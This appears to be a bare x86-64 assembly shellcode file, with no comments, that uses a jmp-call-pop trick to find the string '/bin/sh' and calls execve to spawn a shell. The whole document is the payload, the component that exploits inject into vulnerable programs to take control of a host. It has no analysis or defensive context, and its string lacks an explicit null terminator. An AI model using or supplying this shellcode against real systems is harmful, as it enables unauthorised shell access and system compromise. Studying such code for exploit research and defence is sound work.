global _start
section .text
_start:
	push 59
	pop rax
	jmp cuaker
returner:
	pop rdi
	xor rsi, rsi
	xor rdx, rdx
	syscall
	inc rax
	xor rdi, rdi
	syscall
cuaker:	
	call returner
	db "/bin/sh"
